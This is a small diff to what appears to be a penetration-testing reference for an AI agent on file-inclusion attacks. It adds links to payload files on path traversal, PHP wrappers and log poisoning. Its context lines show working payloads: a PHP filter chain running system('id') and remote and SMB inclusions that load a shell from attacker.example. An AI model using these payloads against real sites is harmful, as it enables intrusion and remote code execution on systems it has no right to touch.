@@ -134,3 +134,8 @@ python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
 ?page=http://attacker.example/shell.txt%00 # null byte to strip appended extension
 ?page=\\attacker.example\share\shell.php   # SMB (Windows, no allow_url_include needed)
 ```
+
+## Extended Resources
+
+- `agent/references/payloads/file-inclusion-payloads.md` — path traversal, PHP wrappers, null byte, log poisoning, interesting files
+- `agent/references/payloads/directory-traversal-payloads.md` — encoding variants, null byte, double URL encoding, OS-specific paths
